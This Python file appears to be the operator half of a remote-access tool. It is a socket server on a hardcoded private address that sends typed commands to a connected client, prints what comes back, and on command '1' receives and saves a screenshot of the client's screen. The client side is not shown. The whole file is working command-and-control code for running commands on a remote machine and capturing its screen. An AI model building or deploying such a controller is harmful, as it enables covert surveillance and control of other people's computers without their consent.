import socket

class Server:
    def __init__(self, server_ip, port):
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.server_ip, self.port))

    def start(self):
        self.socket.listen(1)
        print(f'[*] listening as {self.server_ip}:{self.port}')
        while True:
            client_socket, client_address = self.socket.accept()
            print(f'[+] client connected {client_address}')

            self.handle_client(client_socket)

            client_socket.close()

            cmd = input('Wait for new client y/n ') or 'y'
            if cmd.lower() in ['n', 'no']:
                break

        self.socket.close()
        
    def receive_screenshot(self, client_socket):
        screenshot_data = b''
        while True:
            chunk = client_socket.recv(1024)
            if not chunk:
                break
            screenshot_data += chunk

        with open('received_screenshot.png', 'wb') as f:
            f.write(screenshot_data)
        print('[+] Screenshot received and saved as received_screenshot.png')

    def handle_client(self, client_socket):
        client_socket.send('connected'.encode())
        while True:
            cmd = input('>>> ')
            client_socket.send(cmd.encode())
            if(cmd == '1'):
                self.receive_screenshot(client_socket)

            if cmd.lower() in ['q', 'quit', 'x', 'exit']:
                break

            result = client_socket.recv(1024).decode()
            print(result)
            

if __name__ == "__main__":
    SERVER = "10.88.231.47"
    PORT = 65263
    server = Server(SERVER, PORT)
    server.start()
